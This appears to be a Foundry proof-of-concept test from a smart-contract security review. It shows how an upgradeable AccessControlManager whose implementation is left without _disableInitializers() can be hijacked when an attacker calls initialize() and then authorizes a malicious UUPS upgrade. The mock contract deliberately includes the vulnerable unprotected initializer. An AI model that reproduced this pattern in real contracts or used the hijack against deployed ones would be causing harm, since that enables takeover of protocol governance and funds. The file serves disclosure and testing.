// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title AccessControlManager Implementation Hijack PoC
 *
 * Invariant violated:
 *   Only the protocol deployer/governance should be able to set the
 *   `governor` and `guardian` roles on AccessControlManager.
 *
 * Bug:
 *   The implementation contract is deployed without `_disableInitializers()`
 *   in its constructor and `initialize(...)` has no access modifier. Anyone
 *   can call `initialize` directly on the implementation contract and become
 *   governor of that implementation. Because UUPS upgrade authorization is
 *   gated by `isGovernor(msg.sender)` on the implementation's own storage,
 *   the attacker now controls upgrades of the implementation.
 *
 * Attack sequence:
 *   1. Deployer deploys the AccessControlManager implementation (no
 *      `_disableInitializers`).
 *   2. Attacker calls `initialize(attacker, attacker)` on the implementation
 *      directly.
 *   3. Implementation now reports the attacker as governor; attacker can
 *      authorize a UUPS upgrade of the implementation to malicious code.
 */

// Minimal mock that mirrors the relevant behavior of the vulnerable
// AccessControlManager. `initialize` has no protection and the constructor
// does NOT call `_disableInitializers()`.
contract AccessControlManagerMock {
    // OZ-style initializable storage flag
    bool private _initialized;

    address public governor;
    address public guardian;

    // No _disableInitializers() in constructor — this is the bug.
    constructor() {}

    // Public, unprotected initializer — this is the bug.
    function initialize(address _governor, address _guardian) public {
        require(!_initialized, "already initialized");
        require(_governor != address(0) && _guardian != address(0), "zero");
        _initialized = true;
        governor = _governor;
        guardian = _guardian;
    }

    function isGovernor(address account) external view returns (bool) {
        return account == governor;
    }

    function isGovernorOrGuardian(address account) external view returns (bool) {
        return account == governor || account == guardian;
    }

    // UUPS-style upgrade authorization gated on isGovernor of *this* storage.
    // If attacker initialized this implementation, attacker is governor here.
    address public implementation;

    function upgradeTo(address newImplementation) external {
        require(msg.sender == governor, "not governor");
        implementation = newImplementation;
    }
}

contract ExploitTest is Test {
    AccessControlManagerMock internal implementationContract;

    address internal deployer = address(0xD3);
    address internal legitimateGovernor = address(0x6011);
    address internal attacker = address(0xBADBAD);

    function setUp() public {
        // Deployer publishes the implementation but forgets _disableInitializers.
        vm.prank(deployer);
        implementationContract = new AccessControlManagerMock();
    }

    function test_exploit() public {
        // Pre-condition: implementation is fresh, no governor set.
        assertEq(implementationContract.governor(), address(0));
        assertFalse(implementationContract.isGovernor(attacker));

        // Step 1: Attacker calls initialize() directly on the implementation
        // with themselves as governor and guardian.
        vm.prank(attacker);
        implementationContract.initialize(attacker, attacker);

        // Step 2: Implementation now believes the attacker is governor.
        assertEq(implementationContract.governor(), attacker);
        assertTrue(implementationContract.isGovernor(attacker));
        assertTrue(implementationContract.isGovernorOrGuardian(attacker));

        // Step 3: Legitimate parties cannot re-initialize to fix it.
        vm.prank(deployer);
        vm.expectRevert(bytes("already initialized"));
        implementationContract.initialize(legitimateGovernor, legitimateGovernor);

        // Step 4: Because UUPS `_authorizeUpgrade` checks isGovernor on this
        // implementation's storage, the attacker now controls upgrades of
        // the implementation contract — they can swap it for malicious code.
        address malicious = address(0xC0DEBAD);
        vm.prank(attacker);
        implementationContract.upgradeTo(malicious);
        assertEq(implementationContract.implementation(), malicious);

        // Step 5: A legitimate caller (not "governor" on this implementation)
        // cannot upgrade — confirming attacker has exclusive control.
        vm.prank(deployer);
        vm.expectRevert(bytes("not governor"));
        implementationContract.upgradeTo(address(0xBEEF));
    }
}